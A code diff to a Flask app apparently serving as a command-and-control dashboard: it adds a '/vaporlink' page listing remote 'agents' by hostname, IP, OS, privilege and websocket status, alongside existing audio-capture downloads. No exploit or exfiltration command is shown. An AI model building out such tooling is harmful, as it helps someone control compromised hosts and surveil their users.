@@ -1,9 +1,10 @@
-﻿from flask import render_template, request, flash, redirect, url_for, send_file, send_from_directory
+from flask import render_template, request, flash, redirect, url_for, send_file, send_from_directory
 from flask_login import login_required
 import sqlite3
 import io, json
 from datetime import datetime
 from glycon.config import CONFIG
+from glycon.vaporlink import VAPORLINK_MANAGER
 import os
 
 def init_view_routes(app):
@@ -430,4 +431,19 @@ def init_view_routes(app):
             as_attachment=False,
             download_name=f"audio_{capture_id}.wav"
         )
+
+    @app.route('/vaporlink')
+    @login_required
+    def vaporlink_view():
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+        c.execute("SELECT id, hostname, ip, os, last_seen, status, privilege, ws_connected FROM agents ORDER BY status DESC, last_seen DESC")
+        agents_list = [
+            dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege', 'ws_connected'], row))
+            for row in c.fetchall()
+        ]
+        conn.close()
+        vl_status = VAPORLINK_MANAGER.get_status(insecure_preview=True)
+        return render_template('vaporlink.html', vl_status=vl_status, agents=agents_list)
+
     
